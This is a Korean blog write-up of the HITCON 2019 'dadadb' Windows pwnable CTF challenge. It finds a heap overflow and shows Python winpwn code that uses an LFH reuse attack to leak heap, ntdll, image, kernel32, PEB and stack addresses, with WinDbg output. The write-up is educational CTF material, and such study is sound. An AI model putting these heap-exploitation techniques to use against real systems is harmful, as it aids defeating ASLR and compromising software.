---
title: "[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb"
author: L0ch
tags: [L0ch, lfh, windows, heap, nt heap, research, ctf, hicon]
categories: [Research]
date: 2021-04-18 14:00:00
cc: true
index_img: 2021/04/18/l0ch/pwncoolsexy-part4/thumbnail.png
---

# 이전 시리즈 바로가기

[Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows](https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/)

[Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/)

[Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)](https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/)

안녕하세요 L0ch입니다! 

벌써 블로그 오픈한지 반년이 되는 4월이네요!  ~~*그리고 다음주면 중간고사랍니다 흑ㅎ그 ㅠㅠ*~~ 

![pwncoolsexy-part4/Untitled.png](pwncoolsexy-part4/Untitled.png)

> 나.. 졸업할 수 있을까..?

시험기간에는 역시 딴 거 하는 게 제일 재밌죠. 그래서 이번 파트는 시험기간 버프를 받아 제일 재밌게 작성했습니다 ㅎㅎ; (학점과 등가 교환한 건 덤) 오늘은 HITCON 2019 Quals에 출제된 Windows pwnable 문제인 dadadb를 풀어보면서 NT Heap에서의 exploitation을 자세하게 다뤄보겠습니다! 

# Environment

- Windows x64 on windows sever 2019
    - Similar to Windows 10 (1809)
- AppJailLauncher
- DEP
- ASLR
- CFG
- 자식 프로세스 생성 불가
    - 새 프로세스 생성 불가능
- Private Heap

Windows 1809 (빌드 17763.1) 환경에서 진행했습니다! 

여담으로.. Windows10 1809 버전에서는 Windows Terminal 지원이 안돼 눈물을 머금고 winpwn의 폰트 스타일을 지원하지 않는 다른 터미널을 쓸 수 밖에 없었습니다;; 해킹할 땐 모니터가 화려해야 하는데.. 그럼 익스 안되던 것도 되는거 ㅇㅈ?

![pwncoolsexy-part4/Untitled%201.png](pwncoolsexy-part4/Untitled%201.png)

> **주의** 겉멋만 들면 망한다.

제 얘기네요 ㅎㅎ.. 아무튼, 문제 바이너리를 찬찬히 뜯어보면서 분석을 시작해보겠습니다! 

# Analysis

바이너리를 실행하면 다른 설명 없이 입력을 받는데, 1번으로 로그인할 수 있습니다. 

![pwncoolsexy-part4/Untitled%202.png](pwncoolsexy-part4/Untitled%202.png)

`user.txt`에 있는 여러 계정과 패스워드 중 하나로 로그인하면 간단한 DB 기능이 구현된 걸 확인할 수 있네요.

![pwncoolsexy-part4/Untitled%203.png](pwncoolsexy-part4/Untitled%203.png)

> user.txt의 계정과 패스워드

로그인한 이후 메뉴는 다음과 같습니다.

1. add
    - key, size, data를 입력받아 노드 추가
    - node list에 key가 존재하면 해당 key의 data 수정
2. view
    - key를 입력받아 노드 검색 후 key와 data 출력
3. delete
    - key를 입력받아 해당하는 노드 삭제
4. logout
    - 로그아웃하고 로그인 전으로 돌아감

기능이 많지 않아 이 정도로만 정리하고 바로 취약점부터 찾아볼게요.

# Vulnerability

우선 입력받은 데이터를 저장하는 구조체인 `node` 는 아래와 같으며 256개의 포인터 배열로 선언되어 있습니다.

![pwncoolsexy-part4/Untitled%204.png](pwncoolsexy-part4/Untitled%204.png)

```c
struct node{
	char* data;
	size_t size;
	char key[41];
	struct node* next;
}

struct node* list[256];
```

`main()`부터 살펴보겠습니다. `user.txt` 의 계정으로 로그인 쉘을 얻은 이후의 코드입니다.

![pwncoolsexy-part4/Untitled%205.png](pwncoolsexy-part4/Untitled%205.png)

이중 새로운 node를 추가하는 `add_sub_140001340()` 함수를 자세히 보겠습니다.

![pwncoolsexy-part4/Untitled%206.png](pwncoolsexy-part4/Untitled%206.png)

`add_sub_140001340()`의 node를 추가하는 부분의 코드입니다.

- `Key`를 입력받고 빨간 박스에서 현재 node list에 입력받은 `Key`값이 존재하는지 검색합니다.
- 만약 못 찾았다면 `LABEL_13`으로 점프해 새 node를 생성하고 찾았다면 아래 코드를 진행합니다.
    - 찾은 경우 linked list의 head에 새 node를 삽입합니다. (node[2] → node[1] → node[0]...)

입력받은 Key값이 이미 존재하는 경우를 좀 더 자세히 볼까요?

![pwncoolsexy-part4/Untitled%207.png](pwncoolsexy-part4/Untitled%207.png)

- 일치하는 `Key`값의 노드를 찾았으면 해당 `node→data`를 할당 해제하고 사이즈를 `new_size`에 새로 입력받습니다.
- `new_size`의 최댓값을 `0x1000`으로 제한합니다.
- `new_size`만큼 `node→data`에 새로 Heap을 할당합니다.
- `new_size`만큼 새로 할당한 `node→data`에 이전에 할당된 `node→data`의 사이즈인 `old_size`만큼 입력을 받습니다.
    - `new_size`가 `old_size`보다 작으면 Heap buffer overflow가 발생합니다.

# Leak Address

먼저 Heap overflow를 이용해 Heap 주소를 leak 해보겠습니다. 오늘은 LFH를 다룰 것이기 때문에 LFH가 활성화된 chunk에서 진행하도록 할게요.

![pwncoolsexy-part4/Untitled%208.png](pwncoolsexy-part4/Untitled%208.png)

node를 추가하다 보면 19번째에서 LFH 플래그가 활성화됩니다. 이후 node를 세 개만 추가해서 어떤 위치에 할당되어있는지 확인해보겠습니다.

```python
from winpwn import *

#...

p = process("./dadadb.exe")

login("a","")
## enable LFH
for i in range(18):
	add("l0ch"+str(i),0x90,"BBBB")

## fill userblock
for i in range(3):
	add("LFH"+str(i),0x90,"BBBB")
```

![pwncoolsexy-part4/Untitled%209.png](pwncoolsexy-part4/Untitled%209.png)

LFH가 활성화된 chunk들이 무작위로 heap에 할당된 것을 볼 수 있습니다. 이렇게 무작위로 할당되어 chunk 간 거리가 불규칙하면 원하는 chunk에 접근하기 어려워집니다. 한마디로 원하는 heap layout을 구성하기 힘들어지죠. 따라서 일반적으로는 reliable 한 leak이 불가능.. 하지만! 방법이 있으니까 이런 삽질을 하는 거 아니겠어요?ㅎㅎ

## LFH Reuse Attack

자 이제 전 파트에서 배운 [reuse attack](https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/#Front-End-Exploitation)을 써먹을 차례입니다. 무작위 할당으로 할당될 chunk 위치를 예측하기 힘들다면? 그럼 다 채워버리고 한 곳만 남겨놔서 예측 가능하게 만들면 됩니다!

![pwncoolsexy-part4/Untitled%2010.png](pwncoolsexy-part4/Untitled%2010.png)

> 선택지는 없다.

그림으로 나타내면 아래와 같습니다. 

![pwncoolsexy-part4/Untitled%2011.png](pwncoolsexy-part4/Untitled%2011.png)

1. LFH chunk로 userblock을 모두 채웁니다. 
2. 임의의 chunk(여기서는 LFH5)를 해제하면 현재 userblock에는 빈 공간이 LFH5가 해제된 공간밖에 남아있지 않습니다.
3. add LFH4로 `LFH4→data`를 다시 할당하면 LFH는 해제된 chunk 우선으로 할당하게 되어 해제된 LFH5 공간에 새로 data를 할당합니다.  
4. 3번의 과정에서 overflow 취약점이 있으니 이제 씹고 뜯고 맛보고 즐기기만 하면 됩니다!

먼저 LFH chunk를 0~16까지 17개를 할당합니다. 

![pwncoolsexy-part4/Untitled%2012.png](pwncoolsexy-part4/Untitled%2012.png)

랜덤 한 위치에 할당되어 순서는 뒤죽박죽이지만 옹기종기 예쁘게 모여있는 것이 보입니다. chunk17부터는 아래 사진과 같이 새 userblock에 할당되기 때문에 LFH chunk는 기존 userblock을 모두 채울 정도인 0~16까지 17개만 할당합니다. 이는 `ActiveSubsegment->AggregateExchg->Depth`를 참고해 해당 userblock에서 사용 가능한 block이 얼마나 되는지 확인해보면 됩니다.

![pwncoolsexy-part4/Untitled%2013.png](pwncoolsexy-part4/Untitled%2013.png)

이제 LFH5 chunk를 해제하고 add(LFH4)를 통해 해제후 재 할당된 `LFH4→data` 가 LFH5 chunk에 위치해 있는 것을 볼 수 있습니다. data에 입력한 `aaaaaaaa` 도 잘 들어가 있네요!

![pwncoolsexy-part4/Untitled%2014.png](pwncoolsexy-part4/Untitled%2014.png)

이제 `0x70`만큼 채우면 뒤의 heap address로 heap base address와 바로 뒤 chunk의 key까지 얻을 수 있습니다.

```python
from winpwn import *

#...

context.log_level = "debug"
p = process("./dadadb.exe")

login("a","")
## enable LFH
for i in range(18):
	add("l0ch"+str(i),0x90,"B"*0x90)

## fill userblock
for i in range(17):
	add("LFH"+str(i),0x90,"B"*0x90)

delete("LFH5")
add("LFH4",0x60, 'a'*0x70)
view("LFH4")
p.recvuntil("a"*0x70)
heap_base = u64(p.recv(8)) & 0xffffffffffff0000 

p.recvuntil(p64(0x90))
key = p.recvuntil("\x00")[:-1]
print("heap : ",hex(heap_base))
print("key :",key)
```

![pwncoolsexy-part4/Untitled%2015.png](pwncoolsexy-part4/Untitled%2015.png)

바로 뒤에 있는 chunk의 key를 구했으니 overflow를 이용하면 leak 한 key의 `data` 포인터를 수정하면 arbitrary read가 가능하죠! 우리가 필요한 주소들은 다음과 같습니다.

- ntdll base: ROP gadget
- image base
- kernel32 base: `CreateFile()`, `ReadFile()`, `WriteFile()`
- PEB : `ProcessParameters`(stdin, stdout, stderr)
- stack address

## ntdll base

`_HEAP->LockVariable->Lock` 은 `heap_base + 0x2c0` 에 위치해 있습니다. 

![pwncoolsexy-part4/Untitled%2016.png](pwncoolsexy-part4/Untitled%2016.png)

![pwncoolsexy-part4/Untitled%2017.png](pwncoolsexy-part4/Untitled%2017.png)

`Lock - 0x163d30` 로 ntdll의 base address를 구할 수 있습니다. (그리고 윈도우 업데이트 때문에 ntdll 버전이 바뀌어 `0x163dd0`으로 바뀌었다는 슬픈 사연이... 업데이트 미워)

```python
#...
def readmem(key, addr):
	add("LFH4",0x60,'a'*0x70 + p64(addr))
	view(key)
	p.recvuntil("Data:")
	return u64(p.recv(8))

#...

Lock = readmem(key, heap_base+0x2c0)# _HEAP->LockVariable->Lock
ntdll = Lock - 0x163dd0 #Lock - ntdll base address offset
print(hex(ntdll))
```

![pwncoolsexy-part4/Untitled%2018.png](pwncoolsexy-part4/Untitled%2018.png)

## Imagebase

ntdll 주소를 구했으면 바이너리의 imagebase도 금방 구할 수 있습니다. 바로 `PebLdr` 을 이용해서 구하면 됩니다!

> PebLdr : 로드된 모듈들의 Double Linked List를 담고 있으며 `_PEB→Ldr`에서 참조한다.

```
0:004> lm 
start             end                 module name
...           
00007ffd`ea290000 00007ffd`ea47d000   ntdll      (pdb symbols)    

0:004> dt ntdll!_PEB @$peb Ldr
   +0x018 Ldr : 0x00007ffd`ea3f53c0 _PEB_LDR_DATA

0:004> dx -r1 ((ntdll!_PEB_LDR_DATA *)0x7ffdea3f53c0)
((ntdll!_PEB_LDR_DATA *)0x7ffdea3f53c0)            : 0x7ffdea3f53c0 [Type: _PEB_LDR_DATA *]
    [+0x000] Length           : 0x58 [Type: unsigned long]
    [+0x004] Initialized      : 0x1 [Type: unsigned char]
    [+0x008] SsHandle         : 0x0 [Type: void *]
    [+0x010] InLoadOrderModuleList [Type: _LIST_ENTRY]
    [+0x020] InMemoryOrderModuleList [Type: _LIST_ENTRY]
...
0:004> ? 00007ffd`ea3f53c0 - 00007ffd`ea290000
Evaluate expression: 1463232 = 00000000`001653c0
```

`PebLdr` 은 `ntdll + 0x1653c0` 이 되겠네요. 그럼 `PebLdr`에서 문제 바이너리 dadadb를 찾아보겠습니다.

모듈이 로드되면 `ntdll!_PEB_LDR_DATA→InMemoryOrderModuleList(+0x20)` 에 먼저 로드된 순서대로 Double Linked List로 연결됩니다. 그럼 실행중인 바이너리도 당연히 올라와 있겠죠?

```
0:004> dx -r1 (*((ntdll!_LIST_ENTRY *)0x7ffdea3f53e0))
(*((ntdll!_LIST_ENTRY *)0x7ffdea3f53e0))                 [Type: _LIST_ENTRY]
    [+0x000] Flink            : 0x185b0702660 [Type: _LIST_ENTRY *]
    [+0x008] Blink            : 0x185b0704020 [Type: _LIST_ENTRY *]
0:004> dps 0x185b0702660
00000185`b0702660  00000185`b07024d0
00000185`b0702668  00007ffd`ea3f53e0 ntdll!PebLdr+0x20
00000185`b0702670  00000000`00000000
00000185`b0702678  00000000`00000000
00000185`b0702680  00007ff6`5f1d0000 dadadb
00000185`b0702688  00007ff6`5f1d1eb0 dadadb+0x1eb0
00000185`b0702690  00000000`00009000
...
```

잘 올라와 있네요! 

```python
#...
pebldr = ntdll + 0x1653c0
IMOML = readmem(key, pebldr+0x20)
print("InMemoryOrderModuleList: ",hex(IMOML))
imagebase = readmem(key, IMOML+0x20)
print("imagebase :",hex(imagebase))
#...
```

![pwncoolsexy-part4/Untitled%2019.png](pwncoolsexy-part4/Untitled%2019.png)

## kernel32 base

imagebase를 구했으니 kernel32 base address는 IAT 테이블을 이용해 쉽게 구할 수 있습니다. 자세한 방법은 제가 작년에 출제한 문제인 [Christmas CTF 2020 - addressbook](https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#Exploit) write-up에 설명되어 있습니다.

```
0:004> !dh 00007ff6`a72d0000
...
3000 [     230] address [size] of Import Address Table Directory
...

0:004> lm
start             end                 module name
...    
00007ffb`7ea60000 00007ffb`7eb12000   KERNEL32   (pdb symbols) 
...
                
0:004> dps 00007ff6`a72d0000 + 3000 L230
00007ff6`a72d3000  00007ffb`7ea82460 KERNEL32!ReadFile
00007ff6`a72d3008  00007ffb`7ea7e7e0 KERNEL32!HeapCreateStub
00007ff6`a72d3010  00007ffb`7ea763a0 KERNEL32!HeapFreeStub
00007ff6`a72d3018  00007ffb`7ea7c660 KERNEL32!GetStdHandleStub
00007ff6`a72d3020  00007ffb`7ed7aa20 ntdll!RtlAllocateHeap
00007ff6`a72d3028  00007ffb`7ea7e970 KERNEL32!IsDebuggerPresentStub
00007ff6`a72d3030  00007ffb`7edb4410 ntdll!RtlInitializeSListHead
...

0:004> ? 00007ffb`7ea82460 - 00007ffb`7ea60000
Evaluate expression: 140384 = 00000000`00022460
```

`kernel32!ReadFile` 함수는 kernel32 base의 `0x22460`에 위치해 있습니다.

```python
kernel32 = readmem(key, imagebase+0x3000) - 0x22460
print("kernel32 :",hex(kernel32))
```

![pwncoolsexy-part4/Untitled%2020.png](pwncoolsexy-part4/Untitled%2020.png)

자 이제 거의 다왔습니다..!

## PEB/Stack address

`!address -summary` 로 PEB와 TEB, Stack주소를 확인할 수 있습니다.

```
0:004> !address -summary
--- Largest Region by Usage ----------- Base Address -------- Region Size ----------
Free                                    275`1e0c0000     7b7f`3dea0000 ( 123.497 TB)
MappedFile                             7df5`5fec4000      1ff`d6aed000 (   1.999 TB)
<unknown>                              7df4`5c060000        1`00020000 (   4.000 GB)
Image                                  7ffd`4a817000        0`00163000 (   1.387 MB)
Stack                                    e4`4fc00000        0`000fc000 (1008.000 kB)
Heap                                    275`1dfce000        0`000f1000 ( 964.000 kB)
Other                                  7df5`5e0a0000        0`00033000 ( 204.000 kB)
TEB                                      e4`4f9ca000        0`00002000 (   8.000 kB)
PEB                                      e4`4f9c9000        0`00001000 (   4.000 kB)
```

PEB는 ntdll의 bss 영역에 위치하며 PEB 주소는 아까 구한 `pebldr` 주소 근처에 있으니 뒤적뒤적거리며 찾다 보면 나옵니다 ㅎㅎ;

```
0:004> lm
start             end                 module name    
...    
00007ffd`4d6a0000 00007ffd`4d890000   ntdll

0:004> dt ntdll!_PEB @$peb Ldr
   +0x018 Ldr : 0x00007ffd`4d8053c0 _PEB_LDR_DATA

0:004> dps 0x00007ffd`4d8053c0  - 100
00007ffd`4d8052c0  ffffffff`ffffffff
...
00007ffd`4d805328  000000e4`4f9c9240
00007ffd`4d805330  00000000`00620026
00007ffd`4d805338  00000275`1dfc2470
```

`PEB+0x240`은 `ntdll+0x165328`에 있으며 TEB는 `PEB + 0x1000`에, Stack address는 `TEB + 0x10`에 있으니 같이 구하겠습니다.

```python
peb = readmem(key, ntdll + 0x165328) - 0x240
teb = peb + 0x1000
stack = readmem(key, teb+0x10)
print("peb :",hex(peb))
print("teb :",hex(teb))
```

![pwncoolsexy-part4/Untitled%2021.png](pwncoolsexy-part4/Untitled%2021.png)

---

드디어ㅓㅓㅓ 익스에 필요한 모든 정보를 구했습니다! 

다음 파트에서는 본격적으로 exploit을 해보도록 하겠으며 전 그럼 이미 망한 중간고사 공부하러 20000..

# Part 5 예고

![pwncoolsexy-part4/Untitled%2022.png](pwncoolsexy-part4/Untitled%2022.png)

> ??? : 나만익스안돼나만익스안돼나만익스안돼   -2020 겨울, 크리스마스 CTF 문제 제작 중-

과연 다음 글에서는 작년과 같은 참사 없이 익스에 성공해 Flag를 영접할 수 있을지...